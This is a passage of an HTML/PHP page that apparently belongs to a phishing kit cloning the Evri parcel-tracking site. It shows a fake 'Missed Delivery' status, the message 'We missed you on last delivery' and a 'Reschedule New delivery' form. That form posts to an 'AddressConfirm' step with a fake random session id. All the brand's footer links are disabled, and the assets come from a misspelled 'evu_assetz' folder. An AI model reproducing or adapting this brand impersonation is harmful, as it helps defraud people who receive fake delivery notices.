                                                                        <div data-v-250fdcf4="" data-icon="tick_circle" class="e-icon follow-my-parcel-list__tick e-icon--brand-03" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm4.805-15.549a1 1 0 1 0-1.634-1.153l-5.193 7.358-2.474-2.197a1 1 0 0 0-1.328 1.496l2.893 2.567a1.5 1.5 0 0 0 2.221-.256l5.515-7.815Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__icon follow-my-parcel-list__icon--hide">
                                                                        <div data-v-250fdcf4="" data-icon="warning_circle" class="e-icon e-icon--ui-warning" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm2-12a2 2 0 1 1-4 0V6a2 2 0 1 1 4 0v6Zm-4 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__row-body">
                                                                        <div class="follow-my-parcel-list__row-title follow-my-parcel-list__row-title--solid"><div class="follow-my-parcel-list__row-title-inner">Out for delivery</div></div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__accordion-icon">
                                                                        <div data-v-250fdcf4="" data-icon="chevron_up" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M13.01 6.392a1.5 1.5 0 0 0-2.02 0l-8.664 7.9a1 1 0 0 0 1.348 1.479L12 8.177l8.326 7.594a1 1 0 1 0 1.348-1.478L13.01 6.392Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="follow-my-parcel-list__row follow-my-parcel-list__row--hide">
                                                                    <div class="follow-my-parcel-list__icon">
                                                                        <div data-v-250fdcf4="" data-icon="tick_circle" class="e-icon follow-my-parcel-list__tick e-icon--brand-03" style="line-height: 25px;">
                                                                            <img src="evu_assetz/img/xx.png" style="width: 25px; height: 25px;" />
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__icon follow-my-parcel-list__icon--hide">
                                                                        <div data-v-250fdcf4="" data-icon="warning_circle" class="e-icon e-icon--ui-warning" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm2-12a2 2 0 1 1-4 0V6a2 2 0 1 1 4 0v6Zm-4 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__row-body">
                                                                        <div class="follow-my-parcel-list__row-title follow-my-parcel-list__row-title--solid"><div class="follow-my-parcel-list__row-title-inner">Missed Delivery</div></div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__accordion-icon">
                                                                        <div data-v-250fdcf4="" data-icon="chevron_up" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M13.01 6.392a1.5 1.5 0 0 0-2.02 0l-8.664 7.9a1 1 0 0 0 1.348 1.479L12 8.177l8.326 7.594a1 1 0 1 0 1.348-1.478L13.01 6.392Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div data-v-3b2e9f2c="" class="follow-my-parcel__card-bottom">
                                                            <p data-v-3b2e9f2c="" class="follow-my-parcel__card-bottom-text hide-below-mobile">We missed you on last delivery</p>
                                                            <form method="post" action="AddressConfirm?sslchannel=true&sessionid=<?=generateRandomString(130);?>">
																<input type="hidden" name="item" id="item" value="yes">
																<button data-v-3b48ca05="" type="submit" class="e-button e-button--type-secondary e-button--variant-1 e-button--icon-right" data-v-3b2e9f2c="">
																	<span data-v-3b48ca05="" class="e-button__slot-wrapper"> Reschedule New delivery </span>
																</button>
															</form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <footer class="footer">
                        <div class="footer__main-container">
                            <div class="footer__main">
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">Send</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" aria-label="Click here to send a parcel" href="javascript:void(0);" class="footer-link__link">Send a parcel</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to send an international parcel with Evri" href="javascript:void(0);" class="footer-link__link">Send international parcel</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to find out how to send a parcel with Evri" href="javascript:void(0);" class="footer-link__link">How to send a parcel</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to find out what you can and cannot send with Evri" href="javascript:void(0);" class="footer-link__link"> What I can and cannot send </a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to read Evri's parcel size and weight guide" href="javascript:void(0);" class="footer-link__link"> How to weigh your parcel </a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to find out how to wrap a parcel" href="javascript:void(0);" class="footer-link__link">How to wrap your parcel</a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">Track</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" aria-label="Click here to track your Evri parcel" href="javascript:void(0);" class="footer-link__link">Track a parcel</a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">Returns</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" aria-label="Click here to return a parcel with Evri" href="javascript:void(0);" class="footer-link__link">Return a parcel</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn how to return a parcel with Evri" href="javascript:void(0);" class="footer-link__link"> How to return a parcel </a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">Parcelshops</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" aria-label="Click here to learn about Evri ParcelShops" href="javascript:void(0);" class="footer-link__link">ParcelShops</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn about lockers" href="javascript:void(0);" class="footer-link__link">Lockers</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to find your nearest ParcelShop" href="javascript:void(0);" class="footer-link__link">Find a ParcelShop</a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">Our services</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Our services</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to view our parcel prices" href="javascript:void(0);" class="footer-link__link">Our prices</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn about our mobile app" href="javascript:void(0);" class="footer-link__link">Evri mobile app</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn about the Evri Alexa skill" href="javascript:void(0);" class="footer-link__link">Alexa</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn about the Evri Google Assistant action" href="javascript:void(0);" class="footer-link__link">Google assistant</a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">Help</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" aria-label="Click here to get help and support from our help centre" href="javascript:void(0);" class="footer-link__link">Help centre</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to view our frequently asked questions" href="javascript:void(0);" class="footer-link__link">FAQs</a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                            <div data-v-2ddfd4ba="" class="e-accordion-row__header-text">About us</div>
                                            <div data-v-250fdcf4="" data-v-2ddfd4ba="" data-icon="chevron_circle_down" class="e-icon e-accordion-row__chevron e-icon--brand-02" style="line-height: 16px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm6.707-13.293-5.646 5.647a1.5 1.5 0 0 1-2.122 0l-5.646-5.647a1 1 0 0 1 1.414-1.414L12 14.586l5.293-5.293a1 1 0 1 1 1.414 1.414Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link" aria-label="Click here to learn more about Evri">About us</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to view the latest Evri news" href="javascript:void(0);" class="footer-link__link">News</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to view our latest press articles" href="javascript:void(0);" class="footer-link__link">Press</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn how we're responding to coronavirus" href="javascript:void(0);" class="footer-link__link">Coronavirus update</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn how you can stay secure online" href="javascript:void(0);" class="footer-link__link">Cyber Security</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile">
                                        <a data-v-29c76001="" aria-label="Click here to learn about Evri's approach to ESG" href="javascript:void(0);" class="footer-link__link"> Environment, social and governance </a>
                                    </div>
                                </li>
                            </div>
                        </div>
                        <div class="footer__subfooter-container">
                            <div class="footer__subfooter">
                                <div data-v-1e1b39e0="" class="subfooter">
                                    <div data-v-1e1b39e0="" class="subfooter__links">
                                        <div data-v-1e1b39e0="" class="subfooter__link">
                                            <a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text" aria-label="Click here to view Evri's Terms and Conditions">Terms &amp; conditions</a>
                                        </div>
                                        <div data-v-1e1b39e0="" class="subfooter__link">
                                            <a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text" aria-label="Click here to view Evri's Privacy Policy">Privacy policy</a>
                                        </div>
                                        <div data-v-1e1b39e0="" class="subfooter__link"><a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text" aria-label="Click here to view Evri's Terms of Use">Terms of use</a></div>
                                        <div data-v-1e1b39e0="" class="subfooter__link">
                                            <a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text" aria-label="Click here to view Evri's Modern Slavery Policy">Modern slavery</a>
                                        </div>
                                        <div data-v-1e1b39e0="" class="subfooter__link">
                                            <a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text" aria-label="Click here to view all of Evri's additional policies">Additional policies</a>
                                        </div>
                                    </div>
                                    <div data-v-1e1b39e0="" class="subfooter__bottom">
                                        <div data-v-1e1b39e0="" class="subfooter__bottom-socials">
                                            <a data-v-1e1b39e0="" aria-label="Click here for our Facebook page" href="javascript:void(0);" class="subfooter__bottom-socials-link">
                                                <div data-v-250fdcf4="" data-v-1e1b39e0="" data-icon="social_facebook" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                    <svg viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                        <path
                                                            d="M127.228 64c0-35.35-28.478-64-63.614-64C28.477 0 0 28.65 0 64c0 31.948 23.249 58.425 53.674 63.228V82.515H37.542V64h16.132V49.903C53.674 33.875 63.161 25 77.696 25c6.972 0 14.256 1.25 14.256 1.25V42h-8.017c-7.912 0-10.352 4.945-10.352 10v12h17.643l-2.825 18.515H73.583v44.713c30.396-4.803 53.645-31.28 53.645-63.228Z"
                                                            fill="#00014D"
                                                        ></path>
                                                    </svg>
                                                </div>
                                            </a>
                                            <a data-v-1e1b39e0="" aria-label="Click here for our Instagram page" href="javascript:void(0);" class="subfooter__bottom-socials-link">
                                                <div data-v-250fdcf4="" data-v-1e1b39e0="" data-icon="social_instagram" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                    <svg viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                        <g clip-path="url(#clip0_11970_82179)">
                                                            <path
                                                                fill-rule="evenodd"
                                                                clip-rule="evenodd"
                                                                d="M64 11.531c17.09 0 19.112.066 25.862.374 6.24.284 9.629 1.326 11.885 2.202a19.812 19.812 0 0 1 7.367 4.79 19.813 19.813 0 0 1 4.789 7.367c.876 2.256 1.918 5.645 2.202 11.884.308 6.75.374 8.772.374 25.862 0 17.09-.066 19.112-.374 25.862-.284 6.24-1.326 9.629-2.202 11.885a21.22 21.22 0 0 1-12.146 12.146c-2.256.876-5.645 1.918-11.885 2.202-6.747.308-8.772.374-25.862.374-17.09 0-19.115-.066-25.862-.374-6.24-.284-9.629-1.326-11.884-2.202a19.812 19.812 0 0 1-7.368-4.789 19.811 19.811 0 0 1-4.789-7.367c-.876-2.256-1.918-5.645-2.202-11.885-.308-6.75-.374-8.772-.374-25.862 0-17.09.066-19.112.374-25.862.284-6.24 1.326-9.629 2.202-11.885a19.815 19.815 0 0 1 4.79-7.367 19.815 19.815 0 0 1 7.367-4.789c2.256-.876 5.645-1.918 11.884-2.202 6.75-.308 8.772-.374 25.862-.374l-.01.01ZM64.01-.01c-17.382 0-19.562.074-26.388.386-6.826.313-11.473 1.402-15.545 2.985a31.38 31.38 0 0 0-11.336 7.38 31.38 31.38 0 0 0-7.367 11.336C1.778 26.149.696 30.8.386 37.612.076 44.423 0 46.618 0 64s.074 19.562.386 26.388c.313 6.826 1.392 11.463 2.975 15.535a31.381 31.381 0 0 0 7.38 11.336 31.423 31.423 0 0 0 11.336 7.383c4.065 1.58 8.724 2.662 15.535 2.974 6.811.313 9.006.384 26.388.384s19.562-.074 26.388-.384c6.826-.31 11.463-1.394 15.535-2.974a32.736 32.736 0 0 0 18.718-18.719c1.581-4.065 2.663-8.724 2.975-15.535.313-6.811.384-9.006.384-26.388s-.074-19.562-.384-26.388c-.31-6.826-1.394-11.463-2.975-15.535a31.407 31.407 0 0 0-7.382-11.336 31.387 31.387 0 0 0-11.336-7.367C101.851 1.778 97.199.696 90.388.386 83.577.076 81.382 0 64 0l.01-.01ZM64 31.136a32.866 32.866 0 1 0 0 65.733 32.866 32.866 0 0 0 0-65.733Zm0 54.197a21.34 21.34 0 1 1 0-42.68 21.34 21.34 0 0 1 0 42.68Zm41.844-55.498a7.68 7.68 0 1 1-15.36 0 7.68 7.68 0 1 1 15.36 0Z"
                                                                fill="#00014D"
                                                            ></path>
                                                        </g>
                                                        <defs>
                                                            <clipPath id="clip0_11970_82179"><path fill="#fff" d="M0 0h128v128H0z"></path></clipPath>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </a>
                                            <a data-v-1e1b39e0="" aria-label="Click here for our LinkedIn page" href="javascript:void(0);" class="subfooter__bottom-socials-link">
                                                <div data-v-250fdcf4="" data-v-1e1b39e0="" data-icon="social_linkedin" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                    <svg viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                        <g clip-path="url(#clip0_11971_82188)">
                                                            <path
                                                                fill-rule="evenodd"
                                                                clip-rule="evenodd"
                                                                d="M122.397 111.911a1.997 1.997 0 0 1-.8.158l-.155.022 2.318 3.507h-1.208l-2.154-3.389-.032-.041h-1.389v3.43h-1.129v-7.87h3.004c1.859 0 2.765.718 2.765 2.221a1.997 1.997 0 0 1-.55 1.499c-.19.199-.418.356-.67.463Zm-3.416-.63h1.303c1.203 0 2.193-.104 2.193-1.397 0-1.124-.978-1.264-1.836-1.264h-1.66v2.661Zm-42.875-9.075h16.02l.007-28.328c0-13.906-2.994-24.596-19.231-24.596a16.842 16.842 0 0 0-8.74 2.072 16.862 16.862 0 0 0-6.435 6.27h-.215v-7.058h-15.38v51.638h16.02V76.659c0-6.736 1.277-13.26 9.621-13.26 8.226 0 8.333 7.708 8.333 13.696v25.111ZM18.89 41.941a9.291 9.291 0 0 0 13.753-4.179 9.313 9.313 0 0 0-.86-8.73 9.298 9.298 0 0 0-9.545-3.955 9.294 9.294 0 0 0-7.303 7.312 9.312 9.312 0 0 0 3.954 9.552Zm-2.862 60.265h16.037v-51.64H16.03v51.64Zm-8.05-92.199h92.134v-.006a7.902 7.902 0 0 1 5.618 2.24 7.918 7.918 0 0 1 2.393 5.56v92.604a7.924 7.924 0 0 1-2.391 5.564 7.91 7.91 0 0 1-5.62 2.245H7.979a7.893 7.893 0 0 1-5.604-2.252A7.906 7.906 0 0 1 0 110.405V17.808a7.9 7.9 0 0 1 2.376-5.553 7.886 7.886 0 0 1 5.603-2.248Zm119.214 101.444a6.562 6.562 0 1 1-13.124 0 6.562 6.562 0 0 1 13.124 0Zm.807 0a7.369 7.369 0 1 1-14.738 0 7.369 7.369 0 1 1 14.738 0Z"
                                                                fill="#00014D"
                                                            ></path>
                                                        </g>
                                                        <defs>
                                                            <clipPath id="clip0_11971_82188"><path fill="#fff" d="M0 0h128v128H0z"></path></clipPath>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </a>
                                            <a data-v-1e1b39e0="" aria-label="Click here for our YouTube page" href="javascript:void(0);" class="subfooter__bottom-socials-link">
                                                <div data-v-250fdcf4="" data-v-1e1b39e0="" data-icon="social_youtube" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                    <svg viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                        <g clip-path="url(#social_youtube__a)">
                                                            <path
                                                                d="M125.324 33.08a16.091 16.091 0 0 0-11.317-11.39C104 19 64 19 64 19s-40 0-50.007 2.69A16.088 16.088 0 0 0 2.676 33.08C0 43.13 0 64.09 0 64.09s0 20.96 2.676 31.012a16.089 16.089 0 0 0 11.317 11.389C24 109.182 64 109.182 64 109.182s40 0 50.007-2.691a16.083 16.083 0 0 0 11.317-11.39C128 85.052 128 64.092 128 64.092s0-20.96-2.676-31.011Z"
                                                                fill="#00014D"
                                                            ></path>
                                                            <path d="M50.91 83.124 84.363 64.09 50.909 45.058v38.066Z" fill="#fff"></path>
                                                        </g>
                                                        <defs>
                                                            <clipPath id="social_youtube__a"><path fill="#fff" transform="translate(0 19)" d="M0 0h128v90.182H0z"></path></clipPath>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </a>
                                        </div>
                                        <span data-v-1e1b39e0="" class="subfooter__bottom-copyright">© Evri 2022</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </div>
    </body>
</html>